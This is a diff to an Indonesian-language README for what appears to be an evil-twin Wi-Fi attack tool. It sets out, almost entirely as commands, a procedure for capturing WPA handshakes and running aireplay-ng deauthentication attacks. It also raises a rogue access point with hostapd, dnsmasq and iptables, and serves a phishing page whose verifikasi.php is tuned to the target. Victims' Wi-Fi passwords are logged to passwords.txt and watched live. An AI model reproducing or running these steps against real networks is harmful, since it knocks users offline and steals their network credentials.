@@ -9,26 +9,32 @@ apt-get install aircrack-ng hostapd dnsmasq iptables apache2 php libapache2-mod-
 
 ## Langkah-Langkah
 
-#### Aktifkan Mode Monitor
+#### 1. Aktifkan Mode Monitor
 
 ```
 airmon-ng check kill
 airmon-ng start [interface_deauth]
 ```
 
-#### Scan Wi-Fi WPA/WPA2-PSK
+#### 2. Scan Wi-Fi WPA/WPA2-PSK
 
 ```
 airodump-ng --encrypt wpa [interface_deauth]
 ```
 
-#### Capture Handshake
+#### 3. Capture Handshake
 
 ```
 airodump-ng --bssid [bssid] --channel [channel] --write [output] [interface_deauth]
 ```
 
-#### Konfigurasi IP
+#### 4. Jalankan Deauth Attack
+
+```
+aireplay-ng -0 10 -a [bssid] [interface_deauth]
+```
+
+#### 5. Konfigurasi IP
 
 ```
 ip addr flush dev [interface_ap]
@@ -36,7 +42,7 @@ ip addr add 10.10.10.1/24 dev [interface_ap]
 ip link set [interface_ap] up
 ```
 
-#### Konfigurasi Hostapd
+#### 6. Konfigurasi Hostapd
 
 ```
 nano hostapd.conf
@@ -54,7 +60,7 @@ auth_algs=1
 ignore_broadcast_ssid=0
 ```
 
-#### Konfigurasi DNSmasq
+#### 7. Konfigurasi DNSmasq
 
 ```
 nano dnsmasq.conf
@@ -72,7 +78,7 @@ no-resolv
 log-dhcp
 ```
 
-#### Konfigurasi iptables
+#### 8. Konfigurasi iptables
 
 ```
 iptables -F
@@ -86,21 +92,24 @@ iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
 iptables -t nat -L -n -v
 ```
 
-#### Backup Direktori Web
+#### 9. Backup Direktori Web
 
 ```
 mkdir /var/www/html/backup
 mv /var/www/html/* /var/www/html/backup
 ```
 
-#### Setup File Web
+#### 10. Setup File Web
 
 ```
 cp conf/index.html /var/www/html
 cp conf/verifikasi.php /var/www/html
 ```
 
-#### Setup File Capture
+> [!NOTE]
+> File `verifikasi.php` harus disesuaikan nilai variabelnya dengan target.
+
+#### 11. Setup File Capture
 
 ```
 cp [output]-01.cap /var/www/html/
@@ -108,7 +117,7 @@ chown root:www-data /var/www/html/[output]-01.cap
 chmod 640 /var/www/html/[output]-01.cap
 ```
 
-#### Setup File Password
+#### 12. Setup File Password
 
 ```
 touch /var/www/html/passwords.txt
@@ -116,39 +125,39 @@ chmod 660 /var/www/html/passwords.txt
 chown -R www-data:www-data /var/www/html
 ```
 
-#### Konfigurasi Apache
+#### 13. Konfigurasi Apache
 
 ```
 cp /etc/apache2/sites-available/000-default.conf /etc/apache2/sites-available/000-default.conf.bak
 cp conf/apache2.conf /etc/apache2/sites-available/000-default.conf
 ```
 
-#### Aktifkan Apache Rewrite
+#### 14. Aktifkan Apache Rewrite
 
 ```
 a2enmod rewrite
 systemctl restart apache2
 ```
 
-#### Jalankan DNSmasq
+#### 15. Jalankan DNSmasq
 
 ```
 dnsmasq -C dnsmasq.conf -d
 ```
 
-#### Jalankan Hostapd
+#### 16. Jalankan Hostapd
 
 ```
 hostapd hostapd.conf
 ```
 
-#### Monitoring Password
+#### 17. Monitoring Password
 
 ```
 tail -f /var/www/html/passwords.txt
 ```
 
-#### Jalankan Deauth Attack
+#### 18. Jalankan Deauth Attack
 
 ```
 aireplay-ng -0 0 -a [bssid] [interface_deauth]
